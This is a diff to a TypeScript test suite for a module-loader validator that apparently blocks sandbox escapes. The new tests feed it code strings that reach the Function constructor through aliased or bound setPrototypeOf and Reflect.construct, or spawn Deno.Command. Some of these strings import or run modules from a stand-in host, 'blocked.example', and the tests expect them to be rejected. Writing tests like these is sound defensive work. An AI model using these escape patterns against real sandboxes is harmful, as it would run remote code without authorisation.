@@ -973,6 +973,33 @@ describe("routing/api/module-loader/http-validator", () => {
           `Reflect.apply(Object.setPrototypeOf, null, [holder, () => {}]);`,
           `const setProto = Reflect.setPrototypeOf;` +
           ` let args = [{}, null]; args = [holder, () => {}]; setProto.apply(null, args);`,
+          `Object.setPrototypeOf.bind(Object, holder, () => {})();`,
+          `Reflect.setPrototypeOf.bind(Reflect, holder, () => {})();`,
+          `const setProto = Object.setPrototypeOf.bind(Object, holder, () => {}); setProto();`,
+          `const setProto = Reflect.setPrototypeOf.bind(Reflect, holder, () => {}); setProto();`,
+          `Object.setPrototypeOf.bind.call(Object.setPrototypeOf, Object, holder, () => {})();`,
+          `Reflect.setPrototypeOf.bind.call(Reflect.setPrototypeOf, Reflect, holder, () => {})();`,
+          `Object.setPrototypeOf.bind.apply(Object.setPrototypeOf, [Object, holder, () => {}])();`,
+          `Reflect.setPrototypeOf.bind.apply(Reflect.setPrototypeOf, [Reflect, holder, () => {}])();`,
+          `const bind = Object.setPrototypeOf.bind;` +
+          ` bind.call(Object.setPrototypeOf, Object, holder, () => {})();`,
+          `const bind = Reflect.setPrototypeOf.bind;` +
+          ` bind.apply(Reflect.setPrototypeOf, [Reflect, holder, () => {}])();`,
+          `Function.prototype.bind.call(Object.setPrototypeOf, Object, holder, () => {})();`,
+          `Function.prototype.bind.apply(Reflect.setPrototypeOf, [Reflect, holder, () => {}])();`,
+          `Reflect.apply(Function.prototype.bind, Object.setPrototypeOf,` +
+          ` [Object, holder, () => {}])();`,
+          `const setProto = Object.setPrototypeOf.bind.call(Object.setPrototypeOf, Object);` +
+          ` setProto(holder, () => {});`,
+          `const setProto = Reflect.setPrototypeOf.bind.apply(Reflect.setPrototypeOf, [Reflect]);` +
+          ` setProto(holder, () => {});`,
+          `const bind = Object.setPrototypeOf.bind;` +
+          ` const setProto = bind.call(Object.setPrototypeOf, Object);` +
+          ` setProto(holder, () => {});`,
+          `const setProto = Function.prototype.bind.call(Object.setPrototypeOf, Object);` +
+          ` setProto(holder, () => {});`,
+          `const setProto = Reflect.apply(Function.prototype.bind,` +
+          ` Reflect.setPrototypeOf, [Reflect]); setProto(holder, () => {});`,
         ]
       ) {
         await assertRejects(
@@ -988,6 +1015,15 @@ describe("routing/api/module-loader/http-validator", () => {
           "calling a borrowed setPrototypeOf mutator must invalidate the target object",
         );
       }
+      await validateHTTPImports(
+        `const first = {}; Object.setPrototypeOf(first, null);` +
+          ` const mutate = Reflect.setPrototypeOf; const second = {};` +
+          ` mutate(second, null);` +
+          ` const third = {};` +
+          ` (Object.setPrototypeOf as typeof Object.setPrototypeOf)(third, null);` +
+          ` const fourth = {}; Object.setPrototypeOf!(fourth, null);`,
+        [],
+      );
       await assertRejects(
         async () =>
           await validateHTTPImports(
@@ -1161,6 +1197,129 @@ describe("routing/api/module-loader/http-validator", () => {
           ` const make = holder.constructor;` +
           ` export const GET = () => new Response(String(make));`,
         [],
+      );
+    });
+
+    it("should allow inert feature detection of prototype mutators", async () => {
+      await validateHTTPImports(
+        `const objectSupport = typeof Object.setPrototypeOf === "function";` +
+          ` const reflectSupport = Reflect.setPrototypeOf !== undefined;` +
+          ` const sameImplementation = Object.setPrototypeOf === Reflect.setPrototypeOf;` +
+          ` export const GET = () => Response.json({` +
+          ` objectSupport, reflectSupport, sameImplementation });`,
+        [],
+      );
+      await validateHTTPImports(
+        `const setProto = Object.setPrototypeOf;` +
+          ` export const support = { setProto: typeof setProto === "function" };`,
+        [],
+      );
+      await validateHTTPImports(
+        `const setProto = Object.setPrototypeOf;` +
+          ` const supported = !!setProto;` +
+          ` const status = setProto ? "supported" : "unsupported";` +
+          ` if (setProto) { exportSupport(supported); }` +
+          ` function exportSupport(_supported: boolean) {}` +
+          ` export { status, supported };`,
+        [],
+      );
+      await validateHTTPImports(
+        `const setProto = Object.setPrototypeOf;` +
+          ` let supported = true;` +
+          ` switch (setProto) { case undefined: supported = false; break; }` +
+          ` export { supported };`,
+        [],
+      );
+      await validateHTTPImports(
+        `const flag = true;` +
+          ` const objectSupport = typeof (Object.setPrototypeOf ?? undefined) === "function";` +
+          ` const reflectSupport = (flag ? Reflect.setPrototypeOf : undefined) !== undefined;` +
+          ` export const GET = () => Response.json({ objectSupport, reflectSupport });`,
+        [],
+      );
+      await validateHTTPImports(
+        `const flag = true; const safeMutate = (_target: object, _prototype: object | null) => true;` +
+          ` const mutate = flag ? Object.setPrototypeOf : safeMutate;` +
+          ` const holder = {}; mutate(holder, null);` +
+          ` export const GET = () => new Response(String(Object.getPrototypeOf(holder)));`,
+        [],
+      );
+      await validateHTTPImports(
+        `const safeMutate = (_target: object, _prototype: object | null) => true;` +
+          ` const mutate = Object.setPrototypeOf ?? safeMutate;` +
+          ` const holder = {}; mutate(holder, null);` +
+          ` export const GET = () => new Response(String(Object.getPrototypeOf(holder)));`,
+        [],
+      );
+      for (
+        const inspection of [
+          `Object.setPrototypeOf == Reflect.setPrototypeOf`,
+          `Object.setPrototypeOf < Reflect.setPrototypeOf`,
+        ]
+      ) {
+        await assertRejects(
+          async () => await validateHTTPImports(`export const result = ${inspection};`, []),
+          Error,
+          "dynamic code generation",
+          "coercing comparisons can invoke hooks on a prototype mutator",
+        );
+      }
+    });
+
+    it("should allow a tracked prototype-mutator alias assigned as a statement", async () => {
+      await validateHTTPImports(
+        `const holder = {}; Object.setPrototypeOf.call(null, holder, null);` +
+          ` export const GET = () => new Response(String(Object.getPrototypeOf(holder)));`,
+        [],
+      );
+      await validateHTTPImports(
+        `const first = {}; Reflect.setPrototypeOf.apply(null, [first, null]);` +
+          ` const second = {}; Reflect.apply(Object.setPrototypeOf, null, [second, null]);` +
+          ` export const GET = () => new Response(String(` +
+          ` Object.getPrototypeOf(first) === Object.getPrototypeOf(second)));`,
+        [],
+      );
+      await validateHTTPImports(
+        `let mutate; mutate = Object.setPrototypeOf;` +
+          ` const holder = {}; mutate(holder, null);` +
+          ` export const GET = () => new Response(String(Object.getPrototypeOf(holder)));`,
+        [],
+      );
+      await assertRejects(
+        async () =>
+          await validateHTTPImports(
+            `let mutate; mutate = Object.setPrototypeOf; const holder = {};` +
+              ` mutate(holder, () => {}); const make = holder.constructor;` +
+              ` make('return import("https://blocked.example/mod.js")')();`,
+            [],
+          ),
+        Error,
+        "dynamic code generation",
+        "the standalone alias assignment must remain tracked at its later call",
+      );
+    });
+
+    it("should retain prototype-mutator capability through logical assignments", async () => {
+      await validateHTTPImports(
+        `let mutate = Object.setPrototypeOf;` +
+          ` const safeMutate = (_target: object, _prototype: object | null) => true;` +
+          ` const holder = {}; (mutate &&= safeMutate)(holder, null);` +
+          ` const make = holder.constructor;` +
+          ` export const GET = () => new Response(String(make));`,
+        [],
+      );
+      await assertRejects(
+        async () =>
+          await validateHTTPImports(
+            `let mutate = Object.setPrototypeOf; const holder = {};` +
+              ` (mutate ||= (_target, _prototype) => false)(holder, () => {});` +
+              ` const make = holder.constructor;` +
+              ` make('return import("https://blocked.example/mod.js")')();`,
+            [],
+          ),
+        Error,
+        "dynamic code generation",
+        "logical assignment can preserve an existing prototype-mutator alias",
       );
     });
 
@@ -1785,6 +1944,21 @@ describe("routing/api/module-loader/http-validator", () => {
           ` const Command = commands.get("run");` +
           ` new Command(Deno.execPath(), { args: ["run", "-A",` +
           ` "https://blocked.example/mod.ts"] }).output();`,
+          `Reflect.apply(Reflect.construct, Reflect, [Deno.Command,` +
+          ` ["deno", { args: ["run", "./x.ts"] }]]);`,
+          `Reflect.construct.bind(Reflect)(Deno.Command,` +
+          ` ["deno", { args: ["run", "./x.ts"] }]);`,
+          `const args = [Deno.Command, ["deno", { args: ["run", "./x.ts"] }]];` +
+          ` Reflect.apply(Reflect.construct, Reflect, args);`,
+          `Reflect.construct.bind(Reflect, Deno.Command,` +
+          ` ["deno", { args: ["run", "./x.ts"] }])();`,
+          `const construct = Reflect.construct.bind(Reflect);` +
+          ` construct(Deno.Command, ["deno", { args: ["run", "./x.ts"] }]);`,
+          `const construct = Reflect.construct.bind(Reflect, Deno.Command,` +
+          ` ["deno", { args: ["run", "./x.ts"] }]); construct();`,
+          `const { bind } = Reflect.construct;` +
+          ` const construct = bind.call(Reflect.construct, Reflect);` +
+          ` construct(Deno.Command, ["deno", { args: ["run", "./x.ts"] }]);`,
         ]
       ) {
         await assertRejects(
@@ -1794,6 +1968,26 @@ describe("routing/api/module-loader/http-validator", () => {
           "reflective construction and opaque storage must retain subprocess capability checks",
         );
       }
+      await validateHTTPImports(
+        `class Safe {} Reflect.construct(Safe, []);`,
+        [],
+      );
+      await validateHTTPImports(
+        `class Command {}` +
+          `const Deno = { Command };` +
+          `const Reflect = { construct: { bind: () => () => undefined } };` +
+          `Reflect.construct.bind(Reflect, Deno.Command,` +
+          ` ["deno", { args: ["run", "./x.ts"] }])();`,
+        [],
+      );
+      await validateHTTPImports(
+        `class Command {}` +
+          `const Deno = { Command };` +
+          `const { bind } = Reflect.construct;` +
+          `const construct = bind.call(Reflect.construct, Reflect);` +
+          `construct(Deno.Command, []);`,
+        [],
+      );
       for (const method of ["spawn", "spawnSync"]) {
         await assertRejects(
           async () =>
@@ -1806,6 +2000,70 @@ describe("routing/api/module-loader/http-validator", () => {
           `Bun.${method} can execute an unchecked module loader`,
         );
       }
+      await validateHTTPImports(
+        `const Command = Deno.Command;` +
+          ` export const support = { Command: typeof Command === "function" };`,
+        [],
+      );
+      await validateHTTPImports(
+        `const Command = Deno.Command;` +
+          ` export const supported = typeof Command === "function";`,
+        [],
+      );
+      await validateHTTPImports(
+        `const flag = true;` +
+          ` export const supported = typeof (flag ? Deno.Command : undefined) === "function";`,
+        [],
+      );
+      await validateHTTPImports(
+        `const Command = Deno.Command;` +
+          ` const supported = !!Command;` +
+          ` if (Command) { exportSupport(supported); }` +
+          ` function exportSupport(_supported: boolean) {}` +
+          ` export { supported };`,
+        [],
+      );
+      await validateHTTPImports(
+        `const Command = Deno.Command;` +
+          ` Command && registerSupport();` +
+          ` function registerSupport() {}`,
+        [],
+      );
+      await validateHTTPImports(
+        `const Command = Deno.Command;` +
+          ` switch (Command) { case undefined: break; default: registerSupport(); }` +
+          ` function registerSupport() {}`,
+        [],
+      );
+      for (
+        const source of [
+          `const Command = Deno.Command; Command || registerSupport();`,
+          `const Command = Deno.Command; registerSupport() && Command;`,
+        ]
+      ) {
+        await assertRejects(
+          async () => await validateHTTPImports(source, []),
+          Error,
+          "dynamic code generation",
+          "logical expressions must not expose a subprocess constructor alias",
+        );
+      }
+      await validateHTTPImports(
+        `let Command = Deno.Command; const Safe = class {};` +
+          ` export const instance = new (Command &&= Safe)();`,
+        [],
+      );
+      await assertRejects(
+        async () =>
+          await validateHTTPImports(
+            `let Command = Deno.Command;` +
+              ` new (Command ||= class {})("deno", { args: ["run", "./unchecked.ts"] });`,
+            [],
+          ),
+        Error,
+        "dynamic code generation",
+        "logical assignment can preserve an existing subprocess constructor alias",
+      );
       for (
         const source of [
           `const getCommand = () => Deno.Command;` +
